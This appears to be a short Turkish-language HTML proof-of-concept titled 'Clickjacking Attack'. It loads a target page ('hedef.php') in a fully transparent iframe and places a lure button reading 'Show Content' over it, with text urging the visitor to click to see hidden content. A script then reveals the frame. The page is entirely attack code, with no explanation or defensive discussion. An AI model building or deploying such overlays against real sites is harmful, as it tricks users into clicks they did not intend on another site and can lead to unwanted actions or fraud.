<!DOCTYPE html>
<html lang="tr">
<head>


    <meta charset="UTF-8">
    <title>Clickjacking Saldırısı</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        .container {
            position: relative;
            width: 100vw;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        h1, p {
            text-align: center;
        }

        iframe {
            width: 100%;
            height: 80vh; /* Or adjust the height as needed */
            border: none;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .show-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #fff;
            padding: 10px 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            cursor: pointer;
        }

        .show-content:hover {
            background-color: #f0f0f0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Gizli İçerik</h1>
        <p>Bu sayfada gizli bir içerik bulunmaktadır. Lütfen tıklayın.</p>
        <iframe src="hedef.php"></iframe>
        <div class="show-content">İçeriği Göster</div>
    </div>

    <script>
        document.querySelector('.show-content').addEventListener('click', function() {
            document.querySelector('iframe').style.opacity = 1;
        });
    </script>
</body>
</html>
